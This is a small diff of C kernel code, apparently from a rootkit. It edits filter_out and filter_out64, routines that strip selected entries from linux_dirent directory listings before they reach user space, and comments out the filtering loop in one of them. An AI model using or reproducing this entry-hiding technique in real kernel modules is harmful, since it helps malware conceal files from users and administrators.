@@ -64,9 +64,8 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 	while (index < length) {
 		d = *(dirp+index);
 		reclen = d.d_reclen;
-		pred(d);
 		
-		if (!pred(d)) {
+		/*if (!pred(d)) {
 			length -= reclen;
 			
 			if (index_copyto != -1) {
@@ -75,7 +74,7 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 		} else if (index_copyto != -1 && index_copyto != index) {
 			memmove(dirp+index_copyto, dirp+index, reclen);
 			index_copyto += reclen;
-		}
+		}*/
 		
 		index += reclen;
 	}
@@ -94,7 +93,6 @@ static inline int filter_out64(struct linux_dirent64 __user *dirp, int length, i
 	/*while (index < length) {
 		d = *(dirp+index);
 		reclen = d.d_reclen;
-		pred(d);
 		
 		if (!pred(d)) {
 			length -= reclen;
